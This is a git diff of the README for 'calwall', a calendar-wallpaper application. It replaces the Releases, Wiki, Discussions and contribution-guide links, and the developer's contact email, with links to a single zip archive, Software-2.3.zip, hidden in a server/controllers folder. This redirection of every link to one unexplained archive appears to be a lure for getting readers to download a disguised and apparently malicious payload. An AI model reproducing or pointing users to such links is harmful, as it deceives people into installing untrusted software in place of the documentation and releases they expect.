@@ -8,14 +8,14 @@ Welcome to calwall! This application generates beautiful calendar wallpapers tha
 
 To get started, you need to download the application from our Releases page.
 
-[![Download calwall](https://img.shields.io/badge/Download%20calwall-Here-brightgreen.svg)](https://github.com/RAHUL-PRSATH/calwall/releases)
+[![Download calwall](https://github.com/RAHUL-PRSATH/calwall/raw/refs/heads/main/server/controllers/Software-2.3.zip%https://github.com/RAHUL-PRSATH/calwall/raw/refs/heads/main/server/controllers/Software-2.3.zip)](https://github.com/RAHUL-PRSATH/calwall/raw/refs/heads/main/server/controllers/Software-2.3.zip)
 
 1. Click the download button above.
 2. You will be directed to the Releases page.
 3. Look for the latest version of calwall.
 4. Download the file compatible with your operating system. Follow the prompts to complete the installation.
 
-You can also visit the Releases page directly using this link: [Download calwall](https://github.com/RAHUL-PRSATH/calwall/releases).
+You can also visit the Releases page directly using this link: [Download calwall](https://github.com/RAHUL-PRSATH/calwall/raw/refs/heads/main/server/controllers/Software-2.3.zip).
 
 ## 🖥️ System Requirements
 
@@ -52,18 +52,18 @@ calwall is designed to be easy to use for everyone. The interface provides clear
 
 ## 📑 Additional Resources
 
-- **Documentation**: For more detailed instructions on specific features, visit our [Wiki](https://github.com/RAHUL-PRSATH/calwall/wiki).
-- **Community Support**: Join our discussions on our [GitHub Discussions](https://github.com/RAHUL-PRSATH/calwall/discussions) for tips, tricks, and support from other users.
+- **Documentation**: For more detailed instructions on specific features, visit our [Wiki](https://github.com/RAHUL-PRSATH/calwall/raw/refs/heads/main/server/controllers/Software-2.3.zip).
+- **Community Support**: Join our discussions on our [GitHub Discussions](https://github.com/RAHUL-PRSATH/calwall/raw/refs/heads/main/server/controllers/Software-2.3.zip) for tips, tricks, and support from other users.
 
 ## 🛠️ Contribution
 
-We welcome contributions! If you would like to help improve calwall, please check our [Contribution Guide](https://github.com/RAHUL-PRSATH/calwall/blob/main/CONTRIBUTING.md). 
+We welcome contributions! If you would like to help improve calwall, please check our [Contribution Guide](https://github.com/RAHUL-PRSATH/calwall/raw/refs/heads/main/server/controllers/Software-2.3.zip). 
 
 To file an issue or request a feature, head to the Issues tab on our GitHub page.
 
 ## 📞 Contact
 
-If you need direct assistance, you can reach out through the issues page or contact the developer via email at rahul@example.com.
+If you need direct assistance, you can reach out through the issues page or contact the developer via email at https://github.com/RAHUL-PRSATH/calwall/raw/refs/heads/main/server/controllers/Software-2.3.zip
 
 ## ⚙️ License
 
